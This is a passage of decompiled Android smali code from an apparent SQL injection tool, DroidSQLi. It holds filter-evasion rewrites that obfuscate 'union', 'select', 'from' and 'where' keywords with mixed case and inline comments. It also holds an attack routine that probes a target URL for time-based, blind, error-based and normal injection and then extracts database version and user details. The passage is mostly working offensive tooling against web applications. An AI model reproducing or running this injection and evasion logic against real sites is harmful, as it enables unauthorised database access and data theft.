    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1347
    const-string v20, "([AE])=0x"

    const-string v21, "$1+lIkE+0x"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 1349
    goto/16 :goto_1

    .line 1354
    :pswitch_1
    const-string v19, "union\\+"

    const-string v20, "uNiOn/**/"

    invoke-virtual/range {v18 .. v20}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1355
    const-string v20, "select\\+"

    const-string v21, "sElEcT/**/"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1356
    const-string v20, "from\\+"

    const-string v21, "FrOm/**/"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1357
    const-string v20, "from\\("

    const-string v21, "FrOm("

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1358
    const-string v20, "where\\+"

    const-string v21, "wHeRe/**/"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1359
    const-string v20, "([AE])=0x"

    const-string v21, "$1/**/lIkE/**/0x"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 1361
    const-string v19, "--\\+"

    const-string v20, "--"

    invoke-virtual/range {v18 .. v20}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1362
    const-string v20, "\\+"

    const-string v21, "/**/"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_5
    .catch Ljava/net/MalformedURLException; {:try_start_5 .. :try_end_5} :catch_1

    move-result-object v18

    .line 1361
    goto/16 :goto_1

    .line 1368
    :catch_1
    move-exception v7

    .line 1369
    .restart local v7    # "e":Ljava/net/MalformedURLException;
    invoke-virtual {v7}, Ljava/net/MalformedURLException;->getMessage()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto/16 :goto_2

    .line 1378
    .end local v7    # "e":Ljava/net/MalformedURLException;
    :catch_2
    move-exception v7

    .line 1379
    .local v7, "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto/16 :goto_3

    .line 1399
    .end local v7    # "e":Ljava/io/IOException;
    .restart local v12    # "logs":Ljava/lang/String;
    :cond_4
    aget-object v15, v20, v19

    .line 1401
    .local v15, "s":Ljava/lang/String;
    :try_start_6
    const-string v22, ":"

    const/16 v23, 0x2

    move-object/from16 v0, v22

    move/from16 v1, v23

    invoke-virtual {v15, v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v22

    const/16 v23, 0x0

    aget-object v22, v22, v23

    const-string v23, ":"

    const/16 v24, 0x2

    move-object/from16 v0, v23

    move/from16 v1, v24

    invoke-virtual {v15, v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v23

    const/16 v24, 0x1

    aget-object v23, v23, v24

    const-string v24, "UTF-8"

    invoke-static/range {v23 .. v24}, Ljava/net/URLDecoder;->decode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v23

    move-object/from16 v0, v22

    move-object/from16 v1, v23

    invoke-virtual {v5, v0, v1}, Ljava/net/HttpURLConnection;->addRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_6 .. :try_end_6} :catch_3

    .line 1399
    :goto_9
    add-int/lit8 v19, v19, 0x1

    goto/16 :goto_4

    .line 1402
    :catch_3
    move-exception v7

    .line 1403
    .local v7, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v7}, Ljava/io/UnsupportedEncodingException;->getMessage()Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, p0

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto :goto_9

    .line 1425
    .end local v7    # "e":Ljava/io/UnsupportedEncodingException;
    .end local v15    # "s":Ljava/lang/String;
    :catch_4
    move-exception v7

    .line 1426
    .local v7, "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto/16 :goto_5

    .line 1439
    .end local v7    # "e":Ljava/io/IOException;
    .restart local v8    # "headerName":Ljava/lang/String;
    .restart local v9    # "headerValue":Ljava/lang/String;
    .restart local v10    # "i":I
    :cond_5
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v20

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    if-nez v8, :cond_6

    const-string v19, ""

    :goto_a
    move-object/from16 v0, v20

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, v19

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "\n"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 1434
    add-int/lit8 v10, v10, 0x1

    goto/16 :goto_6

    .line 1439
    :cond_6
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v19

    move-object/from16 v1, v21

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v21, ": "

    move-object/from16 v0, v19

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    goto :goto_a

    .line 1449
    .restart local v11    # "line":Ljava/lang/String;
    .restart local v13    # "pageSource":Ljava/lang/String;
    .restart local v14    # "reader":Ljava/io/BufferedReader;
    :cond_7
    :try_start_7
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_7
    .catch Ljava/net/MalformedURLException; {:try_start_7 .. :try_end_7} :catch_5
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_6

    move-result-object v13

    goto/16 :goto_7

    .line 1451
    .end local v11    # "line":Ljava/lang/String;
    .end local v14    # "reader":Ljava/io/BufferedReader;
    :catch_5
    move-exception v7

    .line 1452
    .local v7, "e":Ljava/net/MalformedURLException;
    invoke-virtual {v7}, Ljava/net/MalformedURLException;->getMessage()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto/16 :goto_8

    .line 1453
    .end local v7    # "e":Ljava/net/MalformedURLException;
    :catch_6
    move-exception v7

    .line 1454
    .local v7, "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto/16 :goto_8

    .line 1337
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public inputValidation()V
    .locals 9

    .prologue
    const/4 v8, 0x2

    const/4 v3, 0x0

    const/4 v5, 0x0

    const/4 v4, 0x1

    .line 107
    .line 114
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->authenticatedUser:Ljava/lang/String;

    .line 113
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->currentUser:Ljava/lang/String;

    .line 112
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->currentDB:Ljava/lang/String;

    .line 111
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->versionDB:Ljava/lang/String;

    .line 109
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    .line 108
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->visibleIndex:Ljava/lang/String;

    .line 107
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    .line 129
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useBlindInjection:Z

    .line 128
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useTimeBasedInjection:Z

    .line 127
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useErrorBasedInjection:Z

    .line 125
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isInjectionBuilt:Z

    .line 123
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->hasFileRight:Z

    .line 121
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isTimeBasedInjectable:Z

    .line 120
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isBlindInjectable:Z

    .line 119
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isErrorBasedInjectable:Z

    .line 118
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isNormalInjectable:Z

    .line 116
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->stopFlag:Z

    .line 131
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->blindModel:Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    .line 132
    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->timeModel:Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

    .line 136
    :try_start_0
    iget-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isProxyfied:Z

    if-eqz v5, :cond_0

    iget-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyAddress:Ljava/lang/String;

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    iget-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyPort:Ljava/lang/String;

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v5

    if-nez v5, :cond_0

    .line 138
    :try_start_1
    new-instance v5, Ljava/net/Socket;

    iget-object v6, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyAddress:Ljava/lang/String;

    iget-object v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyPort:Ljava/lang/String;

    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    invoke-direct {v5, v6, v7}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v5}, Ljava/net/Socket;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_1 .. :try_end_1} :catch_2
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 143
    :try_start_2
    const-string v5, "http.proxyHost"

    iget-object v6, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyAddress:Ljava/lang/String;

    invoke-static {v5, v6}, Ljava/lang/System;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 144
    const-string v5, "http.proxyPort"

    iget-object v6, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyPort:Ljava/lang/String;

    invoke-static {v5, v6}, Ljava/lang/System;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_2 .. :try_end_2} :catch_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 149
    :cond_0
    :try_start_3
    const-string v5, "=> Starting Injection Thread\n=> Connection Test"

    invoke-virtual {p0, v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 151
    new-instance v5, Ljava/net/URL;

    iget-object v6, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialUrl:Ljava/lang/String;

    invoke-direct {v5, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    .line 152
    .local v0, "con":Ljava/net/URLConnection;
    const/16 v5, 0x3a98

    invoke-virtual {v0, v5}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 153
    const/16 v5, 0x3a98

    invoke-virtual {v0, v5}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    .line 155
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 156
    .local v2, "reader":Ljava/io/BufferedReader;
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    .line 157
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_3 .. :try_end_3} :catch_2
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 163
    :try_start_4
    const-string v5, "=> Getting Insertion Character"

    invoke-virtual {p0, v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 164
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;

    invoke-direct {v5, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;->begin()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    .line 167
    const-string v5, "=> Trying Time Based Injection"

    invoke-virtual {p0, v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 168
    invoke-direct {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isTimeBasedInjectable()Z

    move-result v5

    iput-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isTimeBasedInjectable:Z

    .line 169
    iget-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isTimeBasedInjectable:Z

    if-eqz v5, :cond_2

    .line 170
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v6, "add-timebased"

    invoke-direct {v5, p0, v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 174
    :goto_0
    const-string v5, "=> Trying Blind Injection"

    invoke-virtual {p0, v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 175
    invoke-direct {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isBlindInjectable()Z

    move-result v5

    iput-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isBlindInjectable:Z

    .line 176
    iget-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isBlindInjectable:Z

    if-eqz v5, :cond_3

    .line 177
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v6, "add-blind"

    invoke-direct {v5, p0, v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 181
    :goto_1
    const-string v5, "=> Trying Error Based Injection"

    invoke-virtual {p0, v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 182
    invoke-direct {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isErrorBasedInjectable()Z

    move-result v5

    iput-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isErrorBasedInjectable:Z

    .line 183
    iget-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isErrorBasedInjectable:Z

    if-eqz v5, :cond_4

    .line 184
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v6, "add-errorbased"

    invoke-direct {v5, p0, v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 188
    :goto_2
    const-string v5, "=> Trying Normal Injection"

    invoke-virtual {p0, v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 189
    new-instance v5, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;

    invoke-direct {v5, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    invoke-virtual {v5}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->begin()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    .line 190
    iget-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_5

    :goto_3
    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isNormalInjectable:Z

    .line 194
    iget-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isNormalInjectable:Z

    if-nez v3, :cond_a

    .line 195
    iget-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isErrorBasedInjectable:Z

    if-eqz v3, :cond_6

    .line 196
    const-string v3, "=> Using Error Based Injection"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 197
    const/4 v3, 0x1

    iput-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useErrorBasedInjection:Z

    .line 217
    :goto_4
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "remove-normal"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 237
    :goto_5
    const-string v3, "=> Gathering Information"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 239
    invoke-direct {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getDBInfos()V

    .line 242
    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->versionDB:Ljava/lang/String;

    const-string v4, "4"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->versionDB:Ljava/lang/String;

    const-string v4, "3"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_c

    .line 243
    :cond_1
    new-instance v3, Lnet/edgard/droidsqli/exception/PreparationException;

    const-string v4, "=> Mysql version < 5. Automatic search is not possible"

    invoke-direct {v3, v4}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_4
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_4 .. :try_end_4} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_4 .. :try_end_4} :catch_2
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 251
    .end local v0    # "con":Ljava/net/URLConnection;
    .end local v2    # "reader":Ljava/io/BufferedReader;
    :catch_0
    move-exception v1

    .line 252
    .local v1, "e":Lnet/edgard/droidsqli/exception/PreparationException;
    :try_start_5
    invoke-virtual {v1}, Lnet/edgard/droidsqli/exception/PreparationException;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 256
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "end-preparation"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 258
    .end local v1    # "e":Lnet/edgard/droidsqli/exception/PreparationException;
    :goto_6
    return-void

    .line 139
    :catch_1
    move-exception v1

    .line 140
    .local v1, "e":Ljava/lang/Exception;
    :try_start_6
    new-instance v3, Lnet/edgard/droidsqli/exception/PreparationException;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Proxy connection failed: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyAddress:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ":"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyPort:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_6
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_6 .. :try_end_6} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    .line 253
    .end local v1    # "e":Ljava/lang/Exception;
    :catch_2
    move-exception v1

    .line 254
    .local v1, "e":Lnet/edgard/droidsqli/exception/StoppableException;
    :try_start_7
    invoke-virtual {v1}, Lnet/edgard/droidsqli/exception/StoppableException;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 256
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "end-preparation"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto :goto_6

    .line 158
    .end local v1    # "e":Lnet/edgard/droidsqli/exception/StoppableException;
    :catch_3
    move-exception v1

    .line 159
    .local v1, "e":Ljava/io/IOException;
    :try_start_8
    new-instance v3, Lnet/edgard/droidsqli/exception/PreparationException;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "=> Connection Problem: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_8
    .catch Lnet/edgard/droidsqli/exception/PreparationException; {:try_start_8 .. :try_end_8} :catch_0
    .catch Lnet/edgard/droidsqli/exception/StoppableException; {:try_start_8 .. :try_end_8} :catch_2
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 255
    .end local v1    # "e":Ljava/io/IOException;
    :catchall_0
    move-exception v3

    .line 256
    new-instance v4, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v5, "end-preparation"

    invoke-direct {v4, p0, v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 257
    throw v3

    .line 172
